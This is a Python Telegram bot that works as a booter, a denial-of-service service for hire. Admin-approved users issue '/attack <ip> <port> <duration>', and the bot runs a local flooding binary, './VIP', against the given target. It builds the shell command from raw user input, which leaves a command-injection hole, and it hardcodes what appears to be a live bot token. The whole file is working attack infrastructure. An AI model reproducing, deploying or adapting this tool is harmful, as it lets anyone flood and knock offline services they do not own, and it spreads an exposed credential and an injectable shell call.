import os
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError
import time

TELEGRAM_BOT_TOKEN = '7245312894:AAHwIdWn7BK6qgkKIyxz4Hkk91JE8n-Vk_w'
APPROVED_USERS_FILE = 'approved_users.txt'  # File to store approved user IDs
ALLOWED_ADMIN_USER_ID = 6484008134  # Your admin user ID
bot_access_free = False  # Set to False to restrict access to approved users

# Flag to track if an attack is in progress
attack_in_progress = False
attack_start_time = 0  # Store the start time of the attack
attack_duration = 0  # Store the duration of the attack

# Function to load approved user IDs from the file
def load_approved_users():
    if os.path.exists(APPROVED_USERS_FILE):
        with open(APPROVED_USERS_FILE, 'r') as file:
            return {int(line.strip()) for line in file.readlines()}
    return set()

# Function to save approved user IDs to the file
def save_approved_users(approved_users):
    with open(APPROVED_USERS_FILE, 'w') as file:
        for user_id in approved_users:
            file.write(f"{user_id}\n")

# Add a user to the approval list
async def approve_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    if user_id != ALLOWED_ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to approve users!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /approve <user_id>*", parse_mode='Markdown')
        return

    try:
        new_user_id = int(context.args[0])
        approved_users = load_approved_users()
        approved_users.add(new_user_id)  # Add the new user ID
        save_approved_users(approved_users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {new_user_id} has been approved!*", parse_mode='Markdown')
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid user ID format!*", parse_mode='Markdown')

# Remove a user from the approval list
async def disapprove_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    if user_id != ALLOWED_ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to disapprove users!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /disapprove <user_id>*", parse_mode='Markdown')
        return

    try:
        user_to_remove = int(context.args[0])
        approved_users = load_approved_users()
        if user_to_remove in approved_users:
            approved_users.remove(user_to_remove)  # Remove the user ID
            save_approved_users(approved_users)
            await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {user_to_remove} has been disapproved!*", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User {user_to_remove} is not in the approved list!*", parse_mode='Markdown')
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid user ID format!*", parse_mode='Markdown')

# Start command to show the bot's capabilities
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Function to run the attack
async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress, attack_start_time, attack_duration
    attack_in_progress = True
    attack_start_time = time.time()  # Record the start time
    attack_duration = int(duration)  # Store the duration of the attack

    try:
        process = await asyncio.create_subprocess_shell(
            f"./VIP {ip} {port} {duration} 40 https://t.me/+DCtV_6BsRok2YmNl",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False  # Reset the flag when the attack is completed
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

# Attack command
async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, attack_start_time, attack_duration
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Load the approved users and check if the user is authorized
    approved_users = load_approved_users()
    if user_id not in approved_users:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*❌ You are not approved to use this bot! Please contact the admin.*", 
            parse_mode='Markdown'
        )
        return

    # Check if an attack is already in progress
    if attack_in_progress:
        remaining_time = int(attack_duration - (time.time() - attack_start_time))
        if remaining_time > 0:
            await context.bot.send_message(
                chat_id=chat_id, 
                text=f"*⏳ Please wait, the bot is busy with another attack! Remaining time: {remaining_time} seconds.*", 
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=chat_id, 
                text="*⏳ Please wait, the bot is busy with another attack!*", 
                parse_mode='Markdown'
            )
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("approve", approve_user))
    application.add_handler(CommandHandler("disapprove", disapprove_user))

    application.run_polling()

if __name__ == '__main__':
    main()
    
